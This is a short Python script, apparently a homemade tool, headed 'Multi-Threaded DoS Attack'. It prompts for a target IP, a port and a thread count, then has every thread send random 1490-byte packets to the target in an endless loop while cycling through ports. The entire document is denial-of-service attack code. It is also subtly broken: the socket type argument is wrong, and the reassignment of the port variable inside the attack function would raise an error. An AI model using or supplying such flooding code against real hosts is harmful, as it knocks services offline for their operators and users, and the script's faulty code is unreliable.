import socket
import threading
import random
sock = socket.socket(socket.AF_INET, socket.SOL_TCP)
bytes = random._urandom(1490)
import os
print("Multi-Threaded DoS Attack\n")
ip = input("IP Target: \n")
port = input("Port: ")
port = int(port)
sent = 0
num_threads = int(input('Number of threads\n'))
def attack():
    while True:
        # print thread id
        port = port
        sent = 0
        print("This is my function running on thread {} and pid {}".format(i, os.getpid()))
        sock.sendto(bytes, (str(ip), int(port)))
        sent+=1
        port+=1
        
        print(f'Packets: {sent}\t port: {port}')
        if port == 65534:   

            port = 1


threads = []
for i in range(num_threads):
    thread = threading.Thread(target=attack)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
